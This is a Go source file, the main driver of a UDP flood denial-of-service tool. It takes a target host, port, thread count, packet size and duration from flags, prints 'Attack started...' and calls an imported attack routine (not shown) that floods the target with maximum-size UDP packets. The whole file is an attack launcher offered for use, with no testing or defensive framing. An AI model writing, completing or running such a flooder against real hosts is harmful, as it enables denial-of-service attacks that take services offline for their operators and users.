package main

import (
	"flag"
	"fmt"
	"time"
	"udpflood/attack"
)

var (
	_host    string
	_port    uint
	_threads uint64
	_size    uint64
	_time    uint
)

func init() {
	flag.StringVar(&_host, "h", "localhost", "host")
	flag.UintVar(&_port, "p", 8080, "port")
	flag.Uint64Var(&_threads, "t", 100, "threads")
	flag.Uint64Var(&_size, "s", 65507, "packet size")
	flag.UintVar(&_time, "time", 10, "time")
	flag.Parse()
}

func main() {
	fmt.Printf("host: %s\n", _host)
	fmt.Printf("port: %d\n", _port)
	fmt.Printf("threads: %d\n", _threads)
	fmt.Printf("size: %d\n", _size)
	fmt.Printf("time duration: %ds\n", _time)
	fmt.Print("Attack started...\n")

	fullAddr := fmt.Sprintf("%s:%d", _host, _port)
	err := attack.Attack(fullAddr, _threads, _size)
	if err != nil {
		fmt.Printf("Attack error: %s\n", err)
		return
	}

	times := time.After(time.Second * time.Duration(_time))

	select {
	case <-make(chan bool, 1):
	case <-times:
		fmt.Printf("Attack finished\n")
		return
	}
}
